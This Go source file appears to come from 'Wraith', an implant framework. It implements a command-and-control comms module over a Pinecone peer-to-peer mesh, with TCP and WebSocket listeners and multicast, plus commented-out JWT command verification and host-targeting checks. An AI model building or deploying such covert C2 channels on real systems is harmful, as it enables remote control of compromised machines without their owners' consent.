package stdmod

import (
	"context"
	"crypto/ed25519"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"sync"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
	"github.com/gorilla/websocket"
	pineconeC "github.com/matrix-org/pinecone/connections"
	pineconeM "github.com/matrix-org/pinecone/multicast"
	pineconeR "github.com/matrix-org/pinecone/router"
	pineconeU "github.com/matrix-org/pinecone/util"
)

// A CommsManager module implementation which utilises (optionally) encrypted JWT
// as a base for its transfer protocol. This allows messages to be signed and
// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
// particularly advanced features and is meant as a simple default which does a
// good job in most usecases.
type PineconeJWTCommsManagerModule struct {
	mutex sync.Mutex

	// Configuration properties

	OwnPrivKey   ed25519.PrivateKey
	AdminPubKey  ed25519.PublicKey
	ListenTcp    bool
	ListenWs     bool
	UseMulticast bool
	StaticPeers  []string
}

func (m *PineconeJWTCommsManagerModule) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	// Ensure this instance is only started once and mark as running if so
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", libwraith.MOD_COMMS_MANAGER))
	}
	defer m.mutex.Unlock()

	// Make sure keys are valid
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
	}

	// Init a dummy logger for pinecone stuff
	dummyLogger := log.New(ioutil.Discard, "", 0)

	// Init pinecone stuff
	pineconeRouter := pineconeR.NewRouter(dummyLogger, m.OwnPrivKey, false)
	pineconeMulticast := pineconeM.NewMulticast(dummyLogger, pineconeRouter)
	pineconeMulticast.Start()
	pineconeManager := pineconeC.NewConnectionManager(pineconeRouter, nil)

	listener := net.ListenConfig{}

	// If static peers are configured, connect to them
	for _, peer := range m.StaticPeers {
		pineconeManager.AddPeer(peer)
	}

	// If inbound pinecone connections are allowed, start listening
	if m.ListenWs {
		go func() {
			var upgrader = websocket.Upgrader{}
			http.DefaultServeMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
				conn, err := upgrader.Upgrade(w, r, nil)
				if err != nil {
					log.Println(err)
					return
				}

				if _, err := pineconeRouter.Connect(
					pineconeU.WrapWebSocketConn(conn),
					pineconeR.ConnectionURI(conn.RemoteAddr().String()),
					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
					pineconeR.ConnectionZone("websocket"),
				); err != nil {
					panic(err)
				}

				fmt.Println("Inbound WS connection", conn.RemoteAddr(), "is connected")
			})

			listener, err := listener.Listen(context.Background(), "tcp", ":0")
			if err != nil {
				panic(err)
			}

			fmt.Printf("Listening for WebSockets on http://%s\n", listener.Addr())

			if err := http.Serve(listener, http.DefaultServeMux); err != nil {
				panic(err)
			}
		}()
	}

	if m.ListenTcp {
		go func() {
			listener, err := listener.Listen(context.Background(), "tcp", ":0")
			if err != nil {
				panic(err)
			}

			fmt.Println("Listening on", listener.Addr())

			for {
				conn, err := listener.Accept()
				if err != nil {
					panic(err)
				}

				if _, err := pineconeRouter.Connect(
					conn,
					pineconeR.ConnectionURI(conn.RemoteAddr().String()),
					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
				); err != nil {
					panic(err)
				}

				fmt.Println("Inbound TCP connection", conn.RemoteAddr(), "is connected")
			}
		}()
	}

	// If enabled, start multicast
	if m.UseMulticast {
		pMulticast := pineconeM.NewMulticast(dummyLogger, pineconeRouter)
		pMulticast.Start()
	}

	/*connectToStaticPeer := func() {
		connected := map[string]bool{} // URI -> connected?
		for _, uri := range m.StaticPeers {
			connected[uri] = false
		}
		attempt := func() {
			for k := range connected {
				connected[k] = false
			}
			for _, info := range router.Peers() {
				connected[info.URI] = true
			}
			for k, online := range connected {
				if !online {
					_ = conn.ConnectToPeer(router, k)
				}
			}
		}
		for {
			attempt()
			time.Sleep(time.Second * 5)
		}
	}*/

	// Mainloop
	for {
		select {
		// Trigger exit when requested
		case <-ctx.Done():
			return

			// Manage transmit queue
			/*case data := <-txQueue:
				// Make sure the data is of the correct type/format, else ignore
				txdata, ok := data.(map[string]any)
				if !ok {
					continue
				}

				var claims jwt.Claims

				// Put all data under "w" key
				claims.Set = map[string]interface{}{"w": txdata}

				claims.EdDSASign(m.TxKey)

			// Manage receive queue
			case data := <-rxQueue:
				// If the data is not a bytearray, it's not a JWT token so should be ignored.
				databytes, ok := data.([]byte)
				if !ok {
					continue
				}

				// Attempt to parse given data as a JWT.
				claims, err := jwt.EdDSACheck(databytes, m.RxKey)

				// If we couldn't parse the data, do not attempt further parsing. No error
				// needs to be reported because this just means we received invalid data.
				if err != nil {
					continue
				}

				// Make sure the token is valid, don't consider expired tokens.
				if !claims.Valid(time.Now()) {
					continue
				}

				if wKey, ok := claims.Set["w"]; !ok {
					// Make sure that the token has a "w" key which holds all Wraith data.

					continue
				} else if wKeyMap, ok := wKey.(map[string]interface{}); !ok {
					// Make sure the "w" key is map[string]interface{} as expected.

					continue
				} else {
					// If all is well, send the subkeys of the "w" key to the appropriate shm cells

					for cell, value := range wKeyMap {
						w.SHMSet(cell, value)
					}
				}*/
		}
	}
}

// Return the name of this module as libwraith.MOD_COMMS_MANAGER
func (m *PineconeJWTCommsManagerModule) WraithModuleName() string {
	return libwraith.MOD_COMMS_MANAGER
}

/*

type ValidityModule struct {
	wraith *libwraith.Wraith
}

func (m *ValidityModule) WraithModuleInit(wraith *libwraith.Wraith) {
	m.wraith = wraith
}
func (m *ValidityModule) ProtoPartModule() {}

func (m *ValidityModule) ProcessProtoPart(hkvs *libwraith.HandlerKeyValueStore, data interface{}) {
	isValid := false

	defer func() {
		if isValid {
			hkvs.Set("validity.valid", true)
		} else {
			hkvs.Set("validity.valid", false)
		}
	}()

	// Enforce validity constraints

	// If there are validity constraints (this function was called), but they are incorrectly formatted,
	// always assume invalid
	if validity, ok := data.(map[string]string); ok {
		// Wraith Fingerprint/ID restriction
		if constraint, ok := validity["wfpt"]; ok {
			// Always fail if an ID restriction is present and Wraith has not been given an ID
			if m.wraith.Conf.Fingerprint == "" {
				return
			}
			match, err := regexp.Match(constraint, []byte(m.wraith.Conf.Fingerprint))
			if !match || err != nil {
				// If the constraint was not satisfied, the data should be dropped
				// If there was an error in checking the match, Wraith will fallback to fail
				// as to avoid running erroneous commands on every Wraith.
				return
			}
		}

		// Host Fingerprint/ID restriction
		if constraint, ok := validity["hfpt"]; ok {
			match, err := regexp.Match(constraint, []byte{}) // TODO
			if !match || err != nil {
				return
			}
		}

		// Hostname restriction
		if constraint, ok := validity["hnme"]; ok {
			hostname, err := os.Hostname()
			if err != nil {
				// Always fail if hostname could not be checked
				return
			}
			match, err := regexp.Match(constraint, []byte(hostname))
			if !match || err != nil {
				return
			}
		}

		// Running username restriction
		if constraint, ok := validity["rusr"]; ok {
			user, err := user.Current()
			if err != nil {
				return
			}
			match, err := regexp.Match(constraint, []byte(user.Username))
			if !match || err != nil {
				return
			}
		}

		// Platform (os/arch) restriction
		if constraint, ok := validity["plfm"]; ok {
			platform := fmt.Sprintf("%s|%s", runtime.GOOS, runtime.GOARCH)
			match, err := regexp.Match(constraint, []byte(platform))
			if !match || err != nil {
				return
			}
		}

		// If we got this far, all checks passed so the payload is valid
		isValid = true
		return
	} else {
		return
	}
}
*/
